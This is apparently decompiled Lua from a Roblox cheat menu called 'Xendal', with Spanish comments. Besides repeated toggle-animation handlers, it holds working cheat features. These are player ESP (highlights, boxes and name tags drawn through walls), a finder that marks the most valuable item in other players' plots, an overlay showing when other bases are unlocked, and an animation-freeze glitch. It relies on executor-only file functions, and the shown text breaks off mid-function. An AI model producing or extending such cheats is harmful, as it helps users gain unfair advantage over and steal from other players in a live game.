-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Main Handler
local function C_1a2()
local script = G2L["1a2"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_1a2);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.ClonerToggle.Holder.Button.LocalScript
local function C_1a9()
local script = G2L["1a9"];
	local toggleButton = script.Parent  -- El botón que cambiará la visibilidad
	local screenGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("Xendal") -- Especifica el ScreenGui
	local fpsFrame = screenGui:WaitForChild("XendalCloner") -- Busca el Frame llamado FpsSwihz en el ScreenGui
	
	local HttpService = game:GetService("HttpService")
	local baseFolder = "Xendal"
	local filePath = baseFolder .. "/" .. game.Players.LocalPlayer.Name .. "_visibility.json"
	
	local isVisible = false -- Controla el estado de la visibilidad
	
	-- ================== SISTEMA DE GUARDADO ==================
	if makefolder and not isfolder(baseFolder) then
		makefolder(baseFolder)
	end
	
	local function loadVisibilityConfig()
		if isfile and isfile(filePath) then
			local raw = readfile(filePath)
			local success, data = pcall(function()
				return HttpService:JSONDecode(raw)
			end)
			if success and type(data) == "table" then
				return data.isVisible
			end
		end
		return false  -- Valor por defecto (oculto)
	end
	
	local function saveVisibilityConfig(newData)
		local current = { isVisible = newData }
		if writefile then
			writefile(filePath, HttpService:JSONEncode(current))
		end
	end
	-- ==========================================================
	
	-- Cargar el estado de visibilidad desde el archivo de configuración
	isVisible = loadVisibilityConfig()
	
	-- Asegurarse de que el Frame esté oculto o visible según el estado guardado
	fpsFrame.Visible = isVisible
	
	-- Función para alternar la visibilidad del Frame
	local function toggleVisibility()
		isVisible = not isVisible
		fpsFrame.Visible = isVisible -- Cambia la visibilidad
	
		-- Cambiar el color del botón basado en la visibilidad
		if isVisible then
			toggleButton.TextColor3 = Color3.fromRGB(70, 130, 180)  -- Azul cuando está visible (ON)
		else
			toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está oculto (OFF)
		end
	
		-- Guardar el nuevo estado de visibilidad
		saveVisibilityConfig(isVisible)
	end
	
	-- Inicializar el estado de color del botón según el estado cargado
	if isVisible then
		toggleButton.TextColor3 = Color3.fromRGB(70, 130, 180)  -- Azul cuando está visible
	else
		toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está oculto
	end
	
	-- Conectar el botón al toggle de visibilidad
	toggleButton.MouseButton1Click:Connect(toggleVisibility)
	
end;
task.spawn(C_1a9);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Main Handler
local function C_1ad()
local script = G2L["1ad"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_1ad);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.BrokenToggle.Holder.Button.LocalScript
local function C_1b4()
local script = G2L["1b4"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local button = script.Parent  -- El script debe estar dentro del TextButton
	
	local ANIM_MAIN = "rbxassetid://104767795538635" 
	local FREEZE_TIME = 0.02
	
	local isEnabled = false  -- Control del toggle
	
	-- Animaciones activas
	local currentTracks = {}
	
	-- Reproducir la animación principal y congelarla
	local function playAnimations()
		local char = player.Character or player.CharacterAdded:Wait()
		local humanoid = char:WaitForChild("Humanoid")
		local animator = humanoid:WaitForChild("Animator")
	
		-- Activar colisión en todas las partes (si lo necesitas)
		for _, part in ipairs(char:GetDescendants()) do
			if part:IsA("BasePart") then
				part.CanCollide = true
			end
		end
	
		-- Crear y reproducir la animación principal
		local anim = Instance.new("Animation")
		anim.AnimationId = ANIM_MAIN
	
		local track = animator:LoadAnimation(anim)
		track:Play()
		table.insert(currentTracks, track)
	
		-- Congelar la animación después de FREEZE_TIME
		task.delay(FREEZE_TIME, function()
			if track then
				track:AdjustSpeed(0)
				track.TimePosition = FREEZE_TIME
			end
		end)
	end
	
	-- Detener animación y restaurar
	local function stopAnimations()
		local char = player.Character
		if char then
			local humanoid = char:FindFirstChild("Humanoid")
			if humanoid then
				humanoid:Move(Vector3.zero)
			end
		end
	
		-- Detener tracks activos
		for _, track in ipairs(currentTracks) do
			if track and track.IsPlaying then
				track:Stop()
			end
		end
		table.clear(currentTracks)
	
		-- Restaurar autorotate
		local char2 = player.Character or player.CharacterAdded:Wait()
		local humanoid2 = char2:WaitForChild("Humanoid")
		humanoid2.AutoRotate = true
	end
	
	-- Toggle del botón
	local function toggleAnimations()
		if isEnabled then
			stopAnimations()
			button.TextColor3 = Color3.fromRGB(255, 255, 255) -- Blanco al desactivarse
		else
			playAnimations()
			button.TextColor3 = Color3.fromRGB(70,130,180) -- Azul al activarse
		end
	
		isEnabled = not isEnabled
	end
	
	button.MouseButton1Click:Connect(toggleAnimations)
	
end;
task.spawn(C_1b4);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Main Handler
local function C_1c1()
local script = G2L["1c1"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
		
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
			
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
			
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
			
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_1c1);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.JumpBoostToggle.Holder.Button.LocalScript
local function C_1c8()
local script = G2L["1c8"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local TweenService = game:GetService("TweenService")
	local activeESPInstances = {}
	
	local RaritySettings = {
		["Secret"]    = {Size = UDim2.new(0,200,0,55)},
		["Brainrot God"] = {Size = UDim2.new(0,200,0,55)},
		["OG"]        = {Size = UDim2.new(0,200,0,55)},
		["Mythic"]    = {Size = UDim2.new(0,200,0,55)},
		["Legendary"] = {Size = UDim2.new(0,200,0,55)},
		["Epic"]      = {Size = UDim2.new(0,200,0,55)},
		["Rare"]      = {Size = UDim2.new(0,200,0,55)},
		["Common"]    = {Size = UDim2.new(0,200,0,55)}
	}
	
	local toggleActive = false
	local lastBestObj = nil
	
	-- Crear notificación programáticamente
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "ESPNotifier"
	ScreenGui.Parent = PlayerGui
	
	local NotificationFrame = Instance.new("Frame")
	NotificationFrame.Name = "NotificationFrame"
	NotificationFrame.Size = UDim2.new(0, 300, 0, 50)
	NotificationFrame.Position = UDim2.new(0.5, -150, -0.2, 0)
	NotificationFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	NotificationFrame.BorderSizePixel = 0
	NotificationFrame.Visible = false
	NotificationFrame.Parent = ScreenGui
	
	local uiCorner = Instance.new("UICorner")
	uiCorner.CornerRadius = UDim.new(0, 7)  -- Ajusta el radio de las esquinas
	uiCorner.Parent = NotificationFrame
	
	local NotificationLabel = Instance.new("TextLabel")
	NotificationLabel.Size = UDim2.new(1,0,1,0)
	NotificationLabel.Position = UDim2.new(0,0,0,0)
	NotificationLabel.BackgroundTransparency = 1
	NotificationLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	NotificationLabel.TextScaled = true
	NotificationLabel.Font = Enum.Font.FredokaOne
	NotificationLabel.Text = ""
	NotificationLabel.Parent = NotificationFrame
	
	local function showNotification(text, duration)
		NotificationLabel.Text = text
		NotificationFrame.Visible = true
		local tweenIn = TweenService:Create(NotificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -150, 0.05, 0)})
		tweenIn:Play()
		task.delay(duration or 2, function()
			local tweenOut = TweenService:Create(NotificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -150, -0.2, 0)})
			tweenOut:Play()
			tweenOut.Completed:Wait()
			NotificationFrame.Visible = false
		end)
	end
	
	-- FUNCIONES DE ESP Y PARSEO
	local function normalizeNumberStr(raw)
		if not raw then return nil end
		if raw:find("%.") and raw:find(",") then
			raw = raw:gsub(",", "")
		elseif raw:find(",") and not raw:find("%.") then
			raw = raw:gsub(",", ".")
		end
		return raw
	end
	
	local function parseMoney(text)
		if not text then return nil end
		local numStr, suffix = text:match("%$([%d%.,]+)%s*([KMBkmb]?)")
		if not numStr then return nil end
		numStr = normalizeNumberStr(numStr)
		if not numStr then return nil end
		local n = tonumber(numStr)
		if not n then return nil end
		suffix = (suffix or ""):upper()
		if suffix == "K" then n = n * 1e3
		elseif suffix == "M" then n = n * 1e6
		elseif suffix == "B" then n = n * 1e9 end
		return n
	end
	
	local function getPerSecondValue(obj)
		if not obj then return nil, nil end
		for _, v in pairs(obj:GetDescendants()) do
			if v:IsA("TextLabel") and v.Text and v.Text:find("%$") and v.Text:find("/s") then
				local amount = parseMoney(v.Text)
				if amount then
					return amount, v.Text
				end
			end
		end
		return nil, nil
	end
	
	local function detectMyPlot()
		local Plots = workspace:FindFirstChild("Plots")
		if not Plots then return nil end
		local myDisplayName = LocalPlayer.DisplayName
		local myName = LocalPlayer.Name
		for _, plot in ipairs(Plots:GetChildren()) do
			if plot:IsA("Model") then
				local plotSign = plot:FindFirstChild("PlotSign")
				if plotSign then
					local surfaceGui = plotSign:FindFirstChildOfClass("SurfaceGui")
					if surfaceGui then
						local frame = surfaceGui:FindFirstChild("Frame")
						if frame then
							local textLabel = frame:FindFirstChildWhichIsA("TextLabel")
							if textLabel and (textLabel.Text:find(myDisplayName) or textLabel.Text:find(myName)) then
								return plot
							end
						end
					end
				end
			end
		end
		return nil
	end
	
	local function findAllRarityLabels(plot)
		local out = {}
		for _, v in pairs(plot:GetDescendants()) do
			if v:IsA("TextLabel") and v.Text then
				for rarity, _ in pairs(RaritySettings) do
					if v.Text:lower():find(rarity:lower()) then
						table.insert(out, v)
					end
				end
			end
		end
		return out
	end
	
	local function clearOldESPs()
		for parent, gui in pairs(activeESPInstances) do
			if gui and gui.Parent then
				gui:Destroy()
			end
			activeESPInstances[parent] = nil
		end
	end
	
	local function updateRarity()
		if not toggleActive then return end
		clearOldESPs()
		local myPlot = detectMyPlot()
		local bestObj = nil
		local bestValue = -1
	
		local Plots = workspace:FindFirstChild("Plots")
		if not Plots then return end
	
		for _, plot in pairs(Plots:GetChildren()) do
			if plot:IsA("Model") and plot ~= myPlot then
				local labels = findAllRarityLabels(plot)
				for _, lbl in ipairs(labels) do
					local parentContainer = lbl.Parent
					local value, text = getPerSecondValue(parentContainer)
					if value and value > bestValue then
						bestValue = value
						bestObj = {
							parent = parentContainer.Parent or parentContainer,
							rarity = lbl.Text,
							displayText = (parentContainer:FindFirstChild("DisplayName") and parentContainer.DisplayName.Text) or (parentContainer.Name or "?"),
							perSecond = text
						}
					end
				end
			end
		end
	
		-- Notificación (solo si ha cambiado el High Value)
		if bestObj and (not lastBestObj or lastBestObj.parent ~= bestObj.parent) then
			-- Mostramos el nombre y el valor por segundo
			showNotification(bestObj.displayText .. " " .. bestObj.perSecond, 3)
		end
		lastBestObj = bestObj
	
		clearOldESPs()
	
		if bestObj and bestObj.parent and bestObj.parent.Parent then
			local parent = bestObj.parent
			local b = Instance.new("BillboardGui", parent)
			b.Name = bestObj.rarity.."_TOP"
			b.Size = RaritySettings[bestObj.rarity] and RaritySettings[bestObj.rarity].Size or UDim2.new(0,200,0,50)
			b.StudsOffset = Vector3.new(0,2.3,0)
			b.AlwaysOnTop = true
	
			local yOffset = 0
			local lblName = Instance.new("TextLabel", b)
			lblName.Size = UDim2.new(1,0,0.45,0)
			lblName.Position = UDim2.new(0,0,yOffset)
			lblName.BackgroundTransparency = 1
			lblName.Text = bestObj.displayText
			lblName.TextColor3 = Color3.fromRGB(255,255,255)
			lblName.TextStrokeColor3 = Color3.new(0,0,0)
			lblName.TextStrokeTransparency = 0
			lblName.TextScaled = false
			lblName.TextSize = 22
			lblName.Font = Enum.Font.FredokaOne
			yOffset = yOffset + 0.45
	
			local lblPer = Instance.new("TextLabel", b)
			lblPer.Size = UDim2.new(1,0,0.35,0)
			lblPer.Position = UDim2.new(0,0,yOffset)
			lblPer.BackgroundTransparency = 1
			lblPer.Text = bestObj.perSecond or ""
			lblPer.TextColor3 = Color3.fromRGB(255, 0, 0)
			lblPer.TextStrokeColor3 = Color3.new(0,0,0)
			lblPer.TextStrokeTransparency = 0
			lblPer.TextScaled = false
			lblPer.TextSize = 16
			lblPer.Font = Enum.Font.FredokaOne
	
			activeESPInstances[parent] = b
		end
	end
	
	-- Toggle
	local toggleButton = script.Parent
	toggleButton.MouseButton1Click:Connect(function()
		toggleActive = not toggleActive
		toggleButton.TextColor3 = toggleActive and Color3.fromRGB(70,130,180) or Color3.fromRGB(255,255,255)
		if toggleActive then
			updateRarity()
		else
			clearOldESPs()
		end
	end)
	
	task.spawn(function()
		while true do
			if toggleActive then
				updateRarity()
			end
			task.wait(0.5)
		end
	end)
	
end;
task.spawn(C_1c8);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Main Handler
local function C_1f9()
local script = G2L["1f9"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_1f9);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.SpeedBoostToggle.Holder.Button.LocalScript
local function C_200()
local script = G2L["200"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	local activeLockTimeEsp = false
	local lteInstances = {}
	
	-- Sonidos
	local SOUND_ID = ""
	
	local function playSound()
		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
		if not hrp then return end
		local sound = Instance.new("Sound")
		sound.SoundId = SOUND_ID
		sound.Volume = 1
		sound.TimePosition = 0.01
		sound.Parent = hrp
		sound:Play()
		sound.Ended:Connect(function()
			if sound.Parent then sound:Destroy() end
		end)
	end
	
	-- Funciones de verificación
	local function isMyPlot(plot)
		local plotSign = plot:FindFirstChild("PlotSign")
		if not plotSign then return false end
		local surfaceGui = plotSign:FindFirstChildOfClass("SurfaceGui")
		if not surfaceGui then return false end
		local frame = surfaceGui:FindFirstChild("Frame")
		if not frame then return false end
		local textLabel = frame:FindFirstChildWhichIsA("TextLabel")
		if not textLabel then return false end
		return textLabel.Text:find(LocalPlayer.DisplayName) or textLabel.Text:find(LocalPlayer.Name)
	end
	
	local function isEmptyPlot(plot)
		local plotSign = plot:FindFirstChild("PlotSign")
		if not plotSign then return false end
		local surfaceGui = plotSign:FindFirstChildOfClass("SurfaceGui")
		if not surfaceGui then return false end
		local frame = surfaceGui:FindFirstChild("Frame")
		if not frame then return false end
		local textLabel = frame:FindFirstChildWhichIsA("TextLabel")
		if not textLabel then return false end
		return textLabel.Text == "Empty Base"
	end
	
	local function isLaserActive(plot)
		local laserFolder = plot:FindFirstChild("Laser")
		if not laserFolder then return false end
		for _, part in ipairs(laserFolder:GetDescendants()) do
			if part:IsA("BasePart") and part.Transparency < 0.9 then
				return true
			end
		end
		return false
	end
	
	local function getRemainingTimeLabel(plot)
		local purchases = plot:FindFirstChild("Purchases")
		if not purchases then return nil end
		local plotBlock = purchases:FindFirstChild("PlotBlock")
		if not plotBlock then return nil end
		local main = plotBlock:FindFirstChild("Main")
		if not main then return nil end
		local billboard = main:FindFirstChild("BillboardGui")
		if not billboard then return nil end
		local label = billboard:FindFirstChild("RemainingTime")
		if label and label:IsA("TextLabel") then
			return label
		end
		return nil
	end
	
	-- Función para actualizar los BillboardGui
	local function updatelock()
		for name, esp in pairs(lteInstances) do
			if not workspace.Plots:FindFirstChild(name) then
				esp:Destroy()
				lteInstances[name] = nil
			end
		end
	
		for _, plot in pairs(workspace.Plots:GetChildren()) do
			if plot:IsA("Model") and not isEmptyPlot(plot) and not isMyPlot(plot) then
				local timeLabel = getRemainingTimeLabel(plot)
				local timeText = timeLabel and timeLabel.Text or ""
				local laserOn = isLaserActive(plot)
				local isUnlocked = not laserOn or timeText == "0s" or timeText == ""
	
				local b = lteInstances[plot.Name]
				if not b then
					b = Instance.new("BillboardGui", plot)
					b.Name = "LockTimeESP_"..plot.Name
					b.Size = UDim2.new(0,130,0,25)
					b.StudsOffset = Vector3.new(0,4,0)
					b.AlwaysOnTop = true
					b.Adornee = plot.Purchases.PlotBlock.Main
	
					local lbl = Instance.new("TextLabel", b)
					lbl.Size = UDim2.new(1,0,1,0)
					lbl.BackgroundTransparency = 1
					lbl.TextScaled = false
					lbl.TextSize = 18
					lbl.TextStrokeTransparency = 0
					lbl.Font = Enum.Font.FredokaOne
	
					lteInstances[plot.Name] = b
				end
	
				local lbl = b:FindFirstChildWhichIsA("TextLabel")
				if isUnlocked then
					lbl.Text = "Unlocked"
					lbl.TextColor3 = Color3.fromRGB(0,255,0)
				else
					local cleanTime = string.match(timeText, "(%d+%a)") or timeText
					lbl.RichText = true
					lbl.Text = string.format('<font color="rgb(255,0,0)">Lock:</font> <font color="rgb(255,255,255)">%s</font>', cleanTime)
				end
			end
		end
	end
	
	-- Guardar color original del TextButton
	local button = script.Parent
	local originalColor
	if button and button:IsA("TextButton") then
		originalColor = button.TextColor3
	end
	
	-- Toggle ESP
	local function toggleESP()
		activeLockTimeEsp = not activeLockTimeEsp
		playSound()
		if button and button:IsA("TextButton") then
			if activeLockTimeEsp then
				button.TextColor3 = Color3.fromRGB(70,130,180)
				updatelock() -- crear BillboardGui al activar
			else
				button.TextColor3 = originalColor
				-- destruir todos los BillboardGui
				for _, esp in pairs(lteInstances) do
					if esp then esp:Destroy() end
				end
				lteInstances = {}
			end
		end
	end
	
	-- Loop de actualización
	RunService.Heartbeat:Connect(function()
		if activeLockTimeEsp then
			updatelock()
		end
	end)
	
	-- Conectar al TextButton
	if button and button:IsA("TextButton") then
		button.MouseButton1Click:Connect(toggleESP)
	end
	
end;
task.spawn(C_200);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Main Handler
local function C_204()
local script = G2L["204"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_204);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspPlayerToggle.Holder.Button.LocalScript
local function C_20b()
local script = G2L["20b"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer
	local button = script.Parent  -- Asume que este script está en un TextButton
	
	local ESPColor = Color3.fromRGB(0, 0, 0) -- Color de respaldo (Blanco)
	local isEnabled = false -- Estado del toggle
	
	local PlayerConnections = {} -- Guardar conexiones por jugador
	local PlayerObjects = {} -- Guardar Highlight, BackupESP y Billboard por jugador
	
	-- Función para actualizar color del botón según el estado
	local function updateButtonAppearance()
		if isEnabled then
			button.TextColor3 = Color3.fromRGB(70,130,180)
		else
			button.TextColor3 = Color3.fromRGB(255, 255, 255)
		end
	end
	
	local function ApplyHighlight(Player)
		if Player == LocalPlayer then return end
	
		local Connections = {}
		local Character = Player.Character or Player.CharacterAdded:Wait()
		local Humanoid = Character:WaitForChild("Humanoid")
	
		-- Highlight principal
		local Highlight = Instance.new("Highlight", Character)
		Highlight.FillColor = Color3.fromRGB(65, 65, 65)
		Highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
	
		-- ESP de respaldo
		local BackupESP = {}
	
		local parts = {
			"Head", "UpperTorso", "LowerTorso", "LeftLeg", "RightLeg",
			"LeftArm", "RightArm", "LeftLowerLeg", "RightLowerLeg",
			"LeftUpperLeg", "RightUpperLeg", "LeftLowerArm", "RightLowerArm",
			"LeftUpperArm", "RightUpperArm"
		}
	
		-- Crear TextLabel sobre la cabeza
		local function CreateNameLabel()
			local head = Character:FindFirstChild("Head")
			if not head then return end
	
			local billboard = Instance.new("BillboardGui")
			billboard.Name = "NameTag"
			billboard.Adornee = head
			billboard.Size = UDim2.new(0, 100, 0, 50)
			billboard.StudsOffset = Vector3.new(0, 3.3, 0)
			billboard.AlwaysOnTop = true
			billboard.MaxDistance = 1000
			billboard.Parent = head
	
			local textLabel = Instance.new("TextLabel")
			textLabel.Size = UDim2.new(1,0,1,0)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = Player.DisplayName
			textLabel.TextColor3 = Color3.new(0, 0, 0)
			textLabel.TextScaled = false
			textLabel.Font = Enum.Font.SourceSansBold
			textLabel.TextSize = 16
			textLabel.Parent = billboard
	
			return billboard
		end
	
		local NameBillboard = CreateNameLabel()
	
		-- Crear ESP de respaldo
		local function CreateBackupESP()
			for _, partName in ipairs(parts) do
				local part = Character:FindFirstChild(partName)
				if part and not BackupESP[partName] then
					local box = Instance.new("BoxHandleAdornment")
					box.Parent = part
					box.Adornee = part
					box.Size = part.Size
					box.Color3 = ESPColor
					box.Transparency = 0.5
					box.AlwaysOnTop = true
					box.ZIndex = 10
					BackupESP[partName] = box
	
